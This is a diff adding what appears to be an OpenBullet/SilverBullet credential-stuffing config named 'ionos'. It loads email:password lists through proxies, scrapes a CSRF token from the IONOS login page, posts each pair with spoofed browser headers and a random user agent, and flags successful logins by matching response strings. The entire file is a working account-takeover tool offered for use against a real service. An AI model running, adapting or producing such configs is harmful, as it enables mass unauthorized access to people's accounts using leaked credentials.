@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "ionos",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-12-19T12:36:56.9859485+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@uzzzul",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "ionos",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#USER_ENCODE FUNCTION URLEncode "<USER>" -> VAR "USER" 
+
+#PASS_ENCODE FUNCTION URLEncode "<PASS>" -> VAR "PASS" 
+
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#GET_CSRF REQUEST GET "https://login.ionos.com/" 
+  
+  HEADER "Origin: https://login.ionos.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.ionos.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9,ar-LB;q=0.8,ar;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 197" 
+  HEADER "User-Agent: <UA>" 
+
+#csrf PARSE "<SOURCE>" LR "name=\"oaologin.csrf\" value=\"" "\">" -> VAR "csrf" 
+
+#LENGTH FUNCTION Length "__lf=Login&__sendingdata=1&oaologin.fp=e51aab831bbb4a7c1dbf1798e7ee0387&oaologin.csrf=bd89e255-a972-4f83-8253-ee3b9ca60677&oaologin.username=<USER>&oaologin.password=<PASS>&__SBMT%3Ad0e750d0%3A=" -> VAR "LEN" 
+
+#LOGIN REQUEST POST "https://login.ionos.com/" 
+  CONTENT "__lf=Login&__sendingdata=1&oaologin.fp=3a90f0f5b1a79cfb008a87938eda2537&oaologin.csrf=<csrf>&oaologin.username=<USER>&oaologin.password=<PASS>&__SBMT%3Ad0e750d0%3A=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.ionos.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.ionos.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://login.ionos.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <LENGTH>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address is incorrect." 
+    KEY "This parameter is mandatory." 
+    KEY "The domain is incorrect." 
+  KEYCHAIN Success OR 
+    KEY "href=\"/pwpanelredirect?__lf=Login#26amp#3BlinkId=standard-pwredirect\"" 
+    KEY "Welcome" 
+
+#author FUNCTION Constant "@uzzzul" -> CAP "configby" 
+
